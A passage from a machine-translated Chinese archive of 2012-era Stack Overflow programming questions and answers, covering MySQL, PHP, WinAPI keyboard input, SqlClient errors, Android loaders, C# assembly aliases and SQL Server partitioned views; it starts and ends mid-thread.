> 时间：2012-06-22T12:00:59.877

```
SELECT * FROM table ORDER BY RAND() LIMIT 1 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-22T12:06:09.233

```
SELECT * FROM `table` ORDER BY RAND() LIMIT 0,1; 
```

[http://akinas.com/pages/en/blog/mysql_random_row/](http://akinas.com/pages/en/blog/mysql_random_row/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T12:14:30.547

您的初始查询**确实**会处理这些漏洞，因为它只是将行的 id 与您计算的随机值进行比较，并且不会尝试获取具有随机 id 的行。

它的问题是它给你一个不均匀的概率：一个大洞后面的任何行都有更大的概率被选中。

这就是为什么建议使用 mysql 技巧`ORDER BY RAND()`（参见其他答案）的原因，因为随机化将是准统一的。

# mongodb - Opa 1.01：如何防止 opa 运行它自己的 mongo 数据库

> ID：11155727
> 
> 赞同：2
> 
> 时间：2012-06-22T11:58:42.230
> 
> 标签：mongodb, opa, database

我已经切换到 opa 1.0.1，现在 opa 似乎在 ~/.opa/mongo 中安装了它自己的 mongodb。显然，这个 mongo 实例在默认的 27017 端口上运行。

如何防止 opa 运行这个新的 mongodb，而是使用已经在我服务器的默认端口上运行的那个？

或者至少，我可以更改新 mondodb 使用的默认端口吗？我试过这个选项

```
--db-remote:mydb localhost:4242 
```

但它似乎不起作用。

谢谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:54:30.927

实际上，使用`--db-remote host:port`启动选项来阻止 Opa 使用 ~/.opa/mongo db。

如果您的应用中只声明了一个 db，请不要添加“:mydb”后缀。

# php - 在我的服务器上上传 PHP 文件时的制表符、换行符编码

> ID：11155733
> 
> 赞同：0
> 
> 时间：2012-06-22T11:58:55.363
> 
> 标签：php, ftp, notepad++

我正在编写一个 PHP 应用程序并在本地开发它（easyPHP）。但是，当我在服务器 (FTP) 上传输文件时，出现以下错误：

*   解析错误：语法错误，第 xx 行 /homez.93/dockydoc/_apps/dockydocs/include/functions.php 中的意外 $end
*   第 1 行出现意外错误函数
*   ETC..;

当我重新下载我的 PHP 文件并使用 Notepad++ 或经典的 windows pad 打开它们时，我的文件中不再有空格、换行符或制表符！这导致服务器无法读取 PHP。

我的文件是没有 BOM 编码的 UTF8（在 Notepad++ 中）。尽管在互联网上进行了彻底的搜索，但我找不到解决这个问题的方法......我任何人都可以提供帮助.. :)

谢谢， 罗曼

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:35:24.507

确保通过 FTP 上传文件时使用 ASCII 模式数据连接。如果您设置为二进制，我相信这会导致这个！

# c++ - OpenCV cvCapture 压缩数据

> ID：11155734
> 
> 赞同：1
> 
> 时间：2012-06-22T11:58:56.757
> 
> 标签：c++, opencv, rtsp

在使用 cvRetrieveFrame 之前，我可以从 cvCapture 中获取压缩数据，这些数据在 cvGrabFrame 之后存储到缓冲区中吗？我需要将它们保存在压缩帧的存档中。

我使用 cvCaptureFromFile 从 Axis IP 摄像机获取 rtsp 流。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:27:33.730

据我所知，这是不可能的。CvCapture 是一个黑盒结构。真的不可能访问里面的数据。

有函数[cv::imencode](http://docs.opencv.org/modules/highgui/doc/reading_and_writing_images_and_video.html#imencode)来压缩图像。再次压缩图像不是最佳选择，但它应该可以工作。

顺便说一句，您使用的是旧的 C API，并且有一个用于 C++ 的更新 API，它使捕获更加优雅：[cv::VideoCapture](http://docs.opencv.org/modules/highgui/doc/reading_and_writing_images_and_video.html#videocapture)。

# c - 使用 Winapi 的键盘输入

> ID：11155735
> 
> 赞同：1
> 
> 时间：2012-06-22T11:58:58.640
> 
> 标签：c, winapi, keyboard

我正在尝试用 winapi 制作一个简单的文本编辑器，它适用于简单的字母，但它不是大写字母或 shift 键。

```
char    keys[256];
int     x = 0;
while (1)
{
  for (x = 0; x <= 256; x++)
     {
        if (GetAsyncKeyState(x) == -32767)
           {
              char c[5];
              GetKeyboardState(keys);
              ToAscii(x, MapVirtualKey(x, 0), keys, c, 0);
              putchar(c[0]);
            }
      }
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:10:44.720

键盘输入的行为比你想象的要复杂得多。您的方法不起作用，因为：

1.  `GetAsyncKeyState`可能会错过键。当用户在通话之间按下一个键时会发生什么？
2.  当你按住一个键时会发生什么？键盘重复怎么办？
3.  最关键的是，您的代码假定键和字符之间存在 1:1 的关系。您没有任何机制来处理诸如 shift / caps lock 状态或死键之类的组合。

如果您尝试解释您正在尝试做的事情会更好，并且您可以获得有关正确方法的建议。尝试重新发明这种基本输入设备的行为可能不是最好的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T19:53:03.223

GetAsyncKeyState 可能不是这里的方法：制作文本编辑器类型控件的真正方法是处理 WM_KEYDOWN 和 WM_CHAR 消息。当您的 HWND 获得焦点时，Windows 会将这些发送到您的 WndProc。这是 Windows EDIT 和 RichEdit 控件使用的技术。

使用[WM_KEYDOWN](http://msdn.microsoft.com/en-us/library/windows/desktop/ms646280(v=vs.85).aspx)处理非字符键——如箭头（VK_LEFT、VK_RIGHT）、向上翻页等；并将[WM_CHAR](http://msdn.microsoft.com/en-us/library/windows/desktop/ms646276(v=vs.85).aspx)用于文本字符。WM_KEYDOWN 使用 VK_ 值告诉您按下的键，并且不考虑换档状态；而 WM_CHAR 确实采取了转变状态，所以给你 'A' vs 'a' 或 '1' vs '!' 作为适当的。（请注意，您必须在消息循环中包含 TranslateMessage 才能发生这种情况。）

说了这么多，更容易/更好的事情就是使用现有的 Windows EDIT 或[RichEdit](http://msdn.microsoft.com/en-us/library/windows/desktop/bb787605(v=vs.85).aspx)控件并让它们为您完成工作 - 很少有充分的理由重新发明轮子 - 除非您是为了好玩而玩耍和学习Win32也许。编写一个合适的文本编辑器是相当复杂的。有很多不明显的东西需要考虑，尤其是当你进入非英语文本时：你需要确保它与从右到左的文本（阿拉伯语、希伯来语）一起正常工作，与习惯于的 IME 一起工作输入日文和中文字符。而且您必须确保屏幕阅读器可以访问您的控件，以便有视觉障碍的用户仍然可以使用该控件。EDIT 和 RichEdit 为您完成所有这些工作。

例如，实际的记事本应用程序只是 EDIT 控件的包装器；而写字板只是包装了一个 RichEdit 控件；两者都让控件完成所有繁重的工作，并且只需在顶部添加额外的 UI 和文件保存/加载功能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T12:12:32.477

试着打电话

```
GetKeyState(VK_CAPITAL); 
```

前

```
GetKeyboardState(keys); 
```

# .net - tSQL 错误“子查询返回超过 1 个值...”不会在 SqlClient 中引发异常

> ID：11155739
> 
> 赞同：4
> 
> 时间：2012-06-22T11:59:19.670
> 
> 标签：.net, tsql, sqlclient

# 介绍

我在 .Net 4.0.30319 SP1Rel 中遇到了 SqlClient 的问题，当我的存储过程产生以下错误时，不会引发异常：

> 子查询返回超过 1 个值。当子查询跟随 =、!=、<、<=、>、>= 或子查询用作表达式时，这是不允许的。

我创建了一个小程序和存储过程来演示这一点。Sql Server 版本是 9.0.4053。

# 代码示例

## 存储过程

```
create proc test
as
select case (select 1 union select 2) when 1 then 1 else 2 end 
```

## .Net 控制台应用程序

```
using System;
using System.Data;
using System.Data.SqlClient;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            SqlConnection conn = new SqlConnection("<your connection string>");
            conn.Open();

            SqlCommand cmd = new SqlCommand("test", conn);
            cmd.CommandType = CommandType.StoredProcedure;
            try
            {
                SqlDataReader reader = cmd.ExecuteReader(CommandBehavior.CloseConnection);
                Console.WriteLine("Finished");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }

            Console.ReadKey();
        }
    }
} 
```

运行此应用程序只需将“完成”写入控制台。

在 de SQL Server Management Studio 中运行存储过程“test”将在结果窗格中报告错误，如下所示：

> 消息 512，级别 16，状态 1，过程测试，第 3 行子查询返回超过 1 个值。当子查询跟随 =、!=、<、<=、>、>= 或子查询用作表达式时，这是不允许的。

# 预期行为

用以下示例替换存储的过程，将给出预期的 System.Data.SqlClient.SqlException。

## 提升错误

```
alter proc test
as
raiserror('Not good at all!', 16, 1) 
```

# 替代问题

我发现的其他一些定义也不会引发异常。

## Raiserror after

```
alter proc test
as
select case (select 1 union select 2) when 1 then 1 else 2 end
raiserror('Not good at all!', 16, 1) 
```

这表明选择语句停止执行存储过程。

## 除以零

```
alter proc test
as
select 1/0 
```

我的结论是 SqlClient 不能正确识别 tSql 批处理的错误状态。有没有人遇到过这个并找到了解决方案？我一直相信 .Net 框架会在任何 tSql 错误上引发异常。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T14:01:12.667

感谢[Martin](https://stackoverflow.com/users/73226/martin-smith)的帮助和迅速的评论，我找到了这种奇怪行为的原因。

过去，其中一位程序员将读取器上的读取包装在测试中，以查看是否有任何行，如下所示：

```
SqlDataReader reader = cmd.ExecuteReader(CommandBehavior.CloseConnection);

if (reader.HasRows)
{
    while (reader.Read()) { /* Do Something */ }
} 
```

我不知道为什么，当没有行时，read() 方法将在第一次调用时返回 false。

无论如何，当 tSQL 中发生错误时，HasRows 属性返回 false，并且从未调用 Read() 方法。因此，SQL 错误不会显示给 SqlClient，也不会引发异常。

您可以将此代码片段添加到示例项目中，就在 ExecuteReader 之后，对 HasRows 进行或不进行测试，然后查看效果。

# android - Android中的GPU时钟速度

> ID：11155743
> 
> 赞同：1
> 
> 时间：2012-06-22T11:59:42.430
> 
> 标签：android, gpu

我正在尝试在 Android 中找到 GPU 时钟速度。到目前为止还没有运气。这有可能吗？我找不到任何指令来获得硬件时钟速度。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:45:31.350

Android 不提供与 GPU 进行低级交互的 API。根据“Android”的含义，甚至必须有一个 GPU 并不完全清楚 - 模拟器将是一个没有的东西的常见示例，并且各种开发板的基本端口可能是另一个。

一个给定的设备供应商可能会选择公开一些低级编程信息，尽管不太可能。不幸的是，如何使用 GPU 的细节往往是他们密切关注并拒绝披露的事情——他们认为这会给他们的竞争对手带来优势——也许，但它显然会阻止加速图形的开源实现司机。

甚至除了信息的可用性之外，还有访问许可的问题。Android 中的图形硬件由诸如surfaceflinger 之类的系统组件拥有，并且在安全设备上并没有真正可用于由第3 方应用程序代码直接交互。

最终，即使你能找到一个数字，它也没有多大意义。内部引擎的时钟速度不会告诉您完成操作所需的时钟周期数、可以进行的并行操作数、将数据移入/移出内存时遇到的延迟以及可用的缓存，算法的效率等。您最好对一些性能测试进行基准测试。

# php - 使用原型获取php脚本中参数的值

> ID：11155744
> 
> 赞同：0
> 
> 时间：2012-06-22T11:59:44.757
> 
> 标签：php, prototypejs

我需要向 ajax 函数发送两个参数。如何获取我的 Php 文件中的值？我只是写 $comment=$_GET["comment"]; 但这并没有发送书面价值。

我的原型脚本如下：

```
comment= $F('comment');  //text from textarea
name= $F('name');  // text from text box
var ajaxUrl = 'addcomment.php';

new Ajax.Request(ajaxUrl,
    {
     method:'post', 
     parameters: {comment: comment, name: name},        
     onSuccess: function(data){

        alert(data.responseText);

     }

}); 
```

php:

```
$comment=$_GET["comment"]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:04:57.387

在 php 文件中试试这个

```
<?php 
$name = $_POST['name'];
$comment = $_POST['comment'];
echo 'Echoing name : '.$name.'\n'.'Echoing comment : '.$comment.'\n';
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:03:19.437

在 PHP 中：

```
$comment = $_POST['comment'];
$name    = $_POST['name'];

echo $name.':'.$comment; 
```

您还可以使用以下命令检查发送的所有数据：

```
print_r($_POST); 
```

如果不存在，您可以通过设置评论和名称的默认值来更进一步：

```
$comment = (isset($_POST['comment']))? $_POST['comment'] : 'Default Comment';
$name    = (isset($_POST['name']))? $_POST['name'] : 'Default Name'; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T12:05:15.360

您应该将 PHP 代码更改为

```
$comment=$_POST["comment"]; 
```

# svn - 处理基于 Web 的白标产品的代码库

> ID：11155745
> 
> 赞同：1
> 
> 时间：2012-06-22T11:59:52.790
> 
> 标签：svn, deployment

我们在 SVN 上开发了一个基于 Web 的产品，现在一位客户以白标合作伙伴的形式购买了它，这意味着他拥有所有代码，但拥有自己的品牌名称。现在的问题是，如果该客户想要一些与我们自己的产品不同的自定义逻辑，我们如何处理这种情况。第一个解决方案是我们在他的服务器上手动部署所有代码文件，但在这种情况下，每当我们对我们的产品进行错误修复时，我们都必须手动在他的文件中进行相同的更改。

有没有更好的方法来实现这一点。我的目标是每当我们修复产品上的错误时，它都会自动集成到客户端代码中，也可以将自定义逻辑仅添加到客户端代码库中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:31:54.443

最好的办法是在将源代码交付给客户之前，首先创建您创建的标签的一个分支。现在将来自客户的所有更改应用到分支上，您可以看到您发布的代码与客户更改之间的所有代码差异。之后制作一个新标签。您现在可以将您在代码上所做的所有错误修复合并到客户的分支中，并且您可以从该分支进行发货，并且在发货之前更好地制作标签。

# list - 可视化温莎城堡对象

> ID：11155748
> 
> 赞同：1
> 
> 时间：2012-06-22T12:00:12.950
> 
> 标签：list, memory-leaks, castle-windsor, castle, instances

是否可以列出容器所持有的所有对象？以及每种对象类型的实例数。这可以被看作是捕捉“内存泄漏”的监控工具。图表会更好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T22:46:48.347

你是说[性能计数器](http://docs.castleproject.org/Windsor.Performance-Counters.ashx)之类的东西吗？

# c# - 两个引用程序集之间的类型歧义

> ID：11155751
> 
> 赞同：4
> 
> 时间：2012-06-22T12:00:31.637
> 
> 标签：c#

我有以下问题开始让我发疯。我`Class1`在 Assembly1 中有一个班级发言权。我移至`Class1`Assembly2 并在 Assembly2 中废弃`Class1`（保留相同的命名空间，我现在无法删除它以避免对我的用户造成重大更改）。

现在我有一个单元测试程序集 TestAssembly2，它同时引用程序集 Assembly1 和 Assembly2。`Class1`现在，当我尝试`Class1`在我的单元测试中使用时，我得到了一个编译问题的歧义。这是有道理的，因为我`Class1`在程序集 Assembly1 和 Assembly2 中都有两个。

**问题** 有没有办法告诉编译器使用`Class1`Assembly2 中定义的（因为 Assembly1 中的那个已经过时）而不是 Assembly1？

**编辑**我不能使用类型转发，因为 Assembly1 不能引用 Assembly2 :(

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-22T12:02:12.900

你可以试试[`TypeForwardedTo`](http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.typeforwardedtoattribute.aspx)属性。

```
[assembly:TypeForwardedTo(typeof(Class1))] 
```

这样，您可以将类型完全移动到另一个程序集而不会破坏任何东西。您甚至不需要重建引用程序集，因为运行时会为您处理转发。
有关更多信息，请参见此处：
[使用 TypeForwardedTo 属性进行类型转发](http://blogs.msdn.com/b/thottams/archive/2006/11/17/typeforwarding-typeforwardedto-attribute-in-runtime-compilerservices.aspx?Redirected=true)

**编辑：**如果您不能从 Assembly1 中引用 Assembly2，您可以定义一个`extern alias`：
[MSDN Documentation for extern alias (C# Reference)](http://msdn.microsoft.com/en-us/library/ms173212%28v=vs.100%29.aspx)

您可以通过在解决方案资源管理器中选择对程序集的引用并在属性窗口中编辑别名来定义它们。

然后，您只需要使用 . 来限定您的类型`yourAlias::Class1`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-22T12:05:27.270

您应该为您的程序集设置别名。

在使用项目的引用节点下，选择 Assembly2 并设置不同的“别名”，例如“a2”。

还要添加`extern alias a2`您的代码。

比，当您需要引用此类型时，请使用`a2::YourName.Class2`. 这将消除歧义。

[Jon Skeet 已经解释了这是如何工作的](https://stackoverflow.com/a/286645/588868)

# android - getLoaderManager().initLoader() 不接受“this”作为参数，尽管类 (ListFragment) 实现了 LoaderManager.LoaderCallbacks

> ID：11155753
> 
> 赞同：65
> 
> 时间：2012-06-22T12:00:34.740
> 
> 标签：android, sqlite, android-loadermanager, android-listfragment

我无法按照在 Android 中使用 SQLite的[指南进行操作。](http://www.vogella.com/articles/AndroidSQLite/article.html)我使用的是 a`ListFragment`而不是 a `ListActivity`（如示例中所示），所以我使用的是`ListFragment`工具`LoaderManager.LoaderCallbacks<Cursor>`。然后，在`fillData()`方法中`ListFragment`：

```
private void fillData() {
    // Fields from the database (projection)
    // Must include the _id column for the adapter to work
    String[] from = new String[] { NotesSQLiteHelper.COLUMN_TITLE };
    // Fields on the UI to which we map
    int[] to = new int[] { R.id.label };

    getLoaderManager().initLoader(0, null, this); //error
    adapter = new SimpleCursorAdapter(getApplicationContext(), R.layout.notes_row, null, from, to, 0);
    setListAdapter(adapter);
} 
```

我得到错误：

```
The method initLoader(int, Bundle, LoaderManager.LoaderCallbacks<D>) in the type LoaderManager is not applicable for the arguments (int, null, NotesActivity.ArrayListFragment) 
```

在标记线上，即使`this`执行`LoaderManager.LoaderCallbacks<Cursor>`。

谢谢你的任何想法。

* * *

## 回答 #1

> 赞同：84
> 
> 时间：2012-07-11T18:47:01.977

您没有使用正确的 `CursorLoader`and实现`Loader`。删除旧的导入并使用这些：

```
import android.support.v4.app.LoaderManager;
import android.support.v4.content.CursorLoader;
import android.support.v4.content.Loader;
import android.support.v4.widget.CursorAdapter; 
```

但是我在使用 SherlockActionBar 时遇到了同样的问题：因为我必须扩展`SherlockListActivity`，所以没有方法`getSupportLoadManager()`。

对此有什么想法吗？

编辑：如果您不知道如何使用片段，请遵循[本教程。](http://code.tutsplus.com/tutorials/android-sdk_fragments--mobile-5367/ "Android 用户界面设计：使用片段")使用 extends SherlockFragment 创建一个新类并将您的显示逻辑移到那里。让您的旧活动扩展 SherlockFragmentActivity 并显示新创建的 SherlockFragment。这样我就让它工作了。感谢@JakeWharton！

* * *

## 回答 #2

> 赞同：59
> 
> 时间：2012-07-06T02:17:00.660

需要注意的几件事（根据我最近与此作斗争的经验）：

1.  如果您的 minSDK 设置为小于 11（即 Gingerbread 的级别为 10）并且您使用 Support Pack 以实现向后兼容性，请确保您使用

    ```
    getSupportLoaderManager().initLoader(LOADER_ID, null, this); 
    ```

2.  您在说您使用 ListFragment 时提到了这一点，但需要重复：不要扩展 Activity，否则支持包将不起作用。相反，扩展 FragmentActivity 类或 ListFragment 类。

3.  对于您的导入，如果您的 minSDK < 11，请确保您使用的是正确的版本：

    ```
     android.support.v4.app.FragmentActivity;
     android.support.v4.app.LoaderManager;
     android.support.v4.content.Loader; 
    ```

希望这可以帮助你......或者至少其他人......

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2014-06-18T06:21:35.353

铸造第三个论点解决了我的问题：

从

```
 getLoaderManager().initLoader(0, null, this); 
```

到

```
 getLoaderManager().initLoader(0, null, (android.app.LoaderManager.LoaderCallbacks<Cursor>) this); 
```

笔记：

1.  minSdk 是 8，我正在使用支持库 v4。
2.  `(android.support.v4.app.LoaderManager.LoaderCallbacks<Cursor>) this)` 不工作。
3.  `getSupportLoaderManager() or getSupportLoadManager()` 不工作。
4.  此代码在活动内部而不是片段

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2016-06-20T11:47:04.297

已经晚了，但也许可以帮助一些人。
如果您在片段中使用加载程序管理器并且您的 min api 低于 HONEYCOMB
您应该使用此导入

```
import android.support.v4.app.LoaderManager;
import android.support.v4.content.CursorLoader;
import android.support.v4.content.Loader;
import android.support.v4.widget.CursorAdapter;      
import android.support.v4.app.Fragment; 
```

并为启动加载器使用此代码

```
getActivity().getSupportLoaderManager().initLoader(/loader stuff*/); 
```

希望这对某人有所帮助。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-02-12T14:51:44.320

将您的导入更改为

```
import android.support.v4.app.Fragment;
import android.support.v4.app.LoaderManager;
import android.support.v4.content.Loader; 
```

并使用

```
getSupportLoaderManager().initLoader(0, null, this); 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2020-04-12T09:43:28.357

这就是你所拥有的：

```
getLoaderManager().initLoader(0, null, this); 
```

这是你应该拥有的：

```
LoaderManager.getInstance(this).initLoader(0, null, this); 
```

第一个不工作的原因：

```
/**
 * @deprecated Use
 * {@link LoaderManager#getInstance(LifecycleOwner) LoaderManager.getInstance(this)}.
 */ 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2014-10-01T13:47:21.247

我的错误是因为这个：

```
//import android.app.ListFragment; Error when doesnt import from support.v4
import android.support.v4.app.ListFragment; 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2015-06-24T22:28:16.777

就我而言，我必须让我的 Activity 从 android.support.v7.app 包中扩展 ActionBarActivity。然后我就可以使用

getSupportLoaderManager().initLoader(0, null, this);

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2013-02-02T16:52:16.393

我在我的应用程序中使用 ActionBarSherlock，我也遇到了这个问题，并完成了其他人在这个问题中讨论的所有步骤。但是，在尝试了所有建议的解决方案后，我仍然遇到同样的问题。

```
The method initLoader(int, Bundle, LoaderManager.LoaderCallbacks<D>) in the type LoaderManager is not applicable for the arguments (int, null, this) 
```

问题是我已经开始期待 Eclipse 会在我丢失某些东西时告诉我，它会告诉我，但不是以我习惯的方式。通常 Eclipse 在其他情况下会告诉我我错过了使某些工作正常工作的覆盖，但这里并没有直接说。我终于发现“LoaderManager.LoaderCallbacks”是问题所在，并意识到我没有回调它，因此这个错误实际上是一个非常有效的错误。添加基本​​覆盖解决了我的问题并让我继续前进。

```
// Creates a new loader after the initLoader () call
@Override
public Loader<Cursor> onCreateLoader(int id, Bundle args) {
  // do work
  return null;
}

@Override
public void onLoadFinished(Loader<Cursor> loader, Cursor data) {
  adapter.swapCursor(data);
}

@Override
public void onLoaderReset(Loader<Cursor> loader) {
  // data is not available anymore, delete reference
  adapter.swapCursor(null);
} 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2017-12-02T22:12:29.110

我遇到了类似的问题，我的 AsyncTaskLoader 没有返回我的列表，但我的解决方案是将调用从 .initLoader 更改为 .restartLoader。

所以我实际上**从未**调用过 .initLoader，只是立即调用了 .restartLoader。

我的片段中有一个 onListItemClick 侦听器，每次退出片段并重新加载 onListItemClick 并浏览它一直崩溃的应用程序。

它可能只是针对我的应用程序，但如果他们遇到片段回栈重新加载问题，希望它可以帮助其他人。

这是我的应用程序中文件管理器部分的一部分，因此它特定于单击您正在加载的片段中的多个 onListItemClicks。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2013-01-21T14:38:19.650

我通过使用 SherlockListFragment（或者您可以使用 ListFragment，我想）解决了这个问题，但将其包含在 Activity 中。我首先创建了一个通用的 FragmentHolderActivity 类，如下所示：

FragmentHolderActivity.java

```
public class FragmentHolderActivity extends SherlockFragmentActivity {

    public static final String FRAGMENT_LAYOUT_RESOURCE_ID = "fragment_layout_resource_id";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Integer fragmentLayoutResourceId = getIntent().getIntExtra(FRAGMENT_LAYOUT_RESOURCE_ID, Integer.MAX_VALUE);
        Assert.assertNotSame(fragmentLayoutResourceId, Integer.MAX_VALUE);

        setContentView(fragmentLayoutResourceId);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case android.R.id.home:
                finish();
                return false;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

} 
```

然后您需要为您的片段创建一个 XML 文件。

your_list_fragment.xml

```
<?xml version="1.0" encoding="utf-8"?>
<fragment
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:name="com.example.YourListFragment"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:id="@+id/fragment" /> 
```

这是您用来启动片段的代码：

```
 Intent intent = new Intent();
    intent.setClass(this, FragmentHolderActivity.class);
    intent.putExtra(FragmentHolderActivity.FRAGMENT_LAYOUT_RESOURCE_ID, R.layout.your_list_fragment);
    startActivity(intent); 
```

您只需告诉 FragmentHolderActivity 使用 your_list_fragment 布局，然后加载 YourListFragment.java

然后您可以使用：`getSherlockActivity().getSupportLoaderManager().initLoader(...)`在 YourListFragment.java

不确定这是否是*正确*的方法，但它将我所有的逻辑都保存在 Fragments 中，这很好。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2013-11-15T01:13:51.540

遇到同样的问题。我的 minSdkVersion 是 14，所以不能使用 android.support.v4 包。

我通过扩展 LoaderCallbacks 而不是 LoaderManager.LoaderCallbacks 并使用这些包来计算它

```
import android.app.LoaderManager.LoaderCallbacks;  
import android.content.CursorLoader;  
import android.database.Cursor;  
import android.widget.SimpleCursorAdapter; 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2017-04-23T19:01:36.647

如果您已经尝试了上述所有方法，但使用“this”参数仍然遇到相同的错误，请按照以下步骤操作：

1.  转到设置并启用即时导入选项。（默认情况下它将启用，您可以使用 Alt+Enter 键来执行此操作）。

2.  剪切已实现LoaderCallback...的活动的整个代码并将其粘贴到文本编辑器中。

3.  然后最后从您粘贴的文本编辑器中复制该活动的整个代码，没有任何导入命令。（只有类/活动的代码）。

4.  你会得到很多错误，因为你还没有导入任何东西。只要在出现错误的地方按 Alt+Enter，它的库就会自动导入。注意：为 CursorLoaders 选择 android.app... 库。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2018-08-31T00:17:22.677

**试试这两条线它会工作**

```
android.support.v4.app.LoaderManager loaderManager = getSupportLoaderManager();

loaderManager.initLoader(LOADER_ID, null,  this); 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2018-09-27T12:22:15.093

我正在使用 minSDK 27 并且遇到了同样的问题，我尝试像@Dexter 建议的那样进行投射，但是给出了一个错误提示`cannot be cast to android.app.LoaderManager$LoaderCallbacks`，所以我然后尝试使用不同的导入语句并且这有效。我注释掉了这些`v4`版本，这就是我现在拥有的，并且该应用程序正在运行：

```
//import android.support.v4.app.LoaderManager;
import android.app.LoaderManager;
import android.support.v4.app.NavUtils;
//import android.support.v4.content.CursorLoader;
import android.content.CursorLoader;
//import android.support.v4.content.Loader;
//import android.content.Loader; 
```

不太确定何时/如何`v4`导入版本。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2019-01-02T12:36:53.823

0

经过长时间的牺牲，如果您使用的是片段，我得到了这个解决方案，那么只需使用这段代码。

`getActivity().getSupportLoaderManager().initLoader(1, null, YourActivity.this);`

我希望这对你有帮助

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2020-01-05T07:21:17.477

我试图`initLoader()`在活动中调用。对我来说这有效

改变

```
getSupportLoaderManager().initLoader(LOADER_ID,null,this); 
```

到

```
getLoaderManager().initLoader(LOADER_ID,null,this); 
```

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2020-04-17T16:22:42.913

如果您使用 API 28 或更高版本，请不要`getLoaderManager`使用：

```
getSupportLoaderManager().initLoader(id, null, this); 
```

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2020-05-07T10:21:18.793

如果您使用 API 29，而不是 getLoaderManager 使用：

```
getSupportLoaderManager().initLoader(id, null, this); 
```

# sql-server - 分区视图不起作用

> ID：11155758
> 
> 赞同：0
> 
> 时间：2012-06-22T12:00:45.617
> 
> 标签：sql-server, sql-server-2012, partitioned-view

我试图让分区视图工作，但仍然看到查询优化器扫描两个表。这是我的脚本：

```
CREATE TABLE A(DataDate [date] NOT NULL CHECK(datepart(yy, DataDate) <= 2010)) 

CREATE TABLE B(DataDate [date] NOT NULL CHECK(datepart(yy, DataDate) > 2010))

CREATE VIEW V AS SELECT * FROM A UNION ALL SELECT * FROM B 

select * from V where datepart(yy, DataDate) = 2009 
```

但是当我查看执行计划时，我看到表**A**和表**B**都被扫描了，并且两个表的“执行次数”都是 1。我希望表**A**有`Number of Executions = 1`，表**B**有`Number of Executions = 0`。我在`SQL Server 2012`。

有人可以澄清这应该如何工作吗？谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:09:01.607

应该像这样工作：

```
CREATE TABLE A(DataDate [date] NOT NULL CHECK(DataDate < '20110101'));

CREATE TABLE B(DataDate [date] NOT NULL CHECK(DataDate >= '20110101'));
go

CREATE VIEW V AS SELECT * FROM A UNION ALL SELECT * FROM B 
go

select * from V where DataDate >= '20090101' and DataDate < '20100101';
go 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T12:16:25.273

从[CREATE VIEW](http://msdn.microsoft.com/en-us/library/ms187956)的文档中，在分区视图上，讨论基表上必须存在的约束时：

> 表 T1 上定义的约束 C1 必须采用以下形式：

```
C1 ::= < simple_interval > [ OR < simple_interval > OR ...]
< simple_interval > :: = 
< col > { < | > | <= | >= | = < value >} 
| < col > BETWEEN < value1 > AND < value2 >
| < col > IN ( value_list )
| < col > { > | >= } < value1 > AND
< col > { < | <= } < value2 > 
```

您的约束不是这种形式，因此它没有资格成为分区视图。您需要简单的约束，例如@Remus 显示的约束，而不是调用函数的约束。

* * *

当然，在 BOL 中查找分区视图的任何地方都可以找到其他建议：

> 将本地数据分区到一台服务器的首选方法是通过分区表。有关详细信息，请参阅[分区表和索引](http://msdn.microsoft.com/en-us/library/ms190787)。

自 SQL Server 2005 中引入分区表以来，分区*表*一直是首选的分区方法。

# python - 用python读取.arrays txt文件？

> ID：11155764
> 
> 赞同：2
> 
> 时间：2012-06-22T12:01:04.053
> 
> 标签：python, arrays, file, numpy

传统上，要在 python 中读取一个用数组填充的文件，我使用以下语法

```
x, y, z = loadtxt("myfile.txt", unpack=True) 
```

它适用于单数组文件。

现在，我有一个更复杂的文件：

```
1.5 3.5 2.5 1.6
4
3
1 2 3 4 5
6 7 8 9 10
11 12 13 14 15
16 17 18 19 20
1 2
3 4
5 6 
```

我想做的是以下事情：

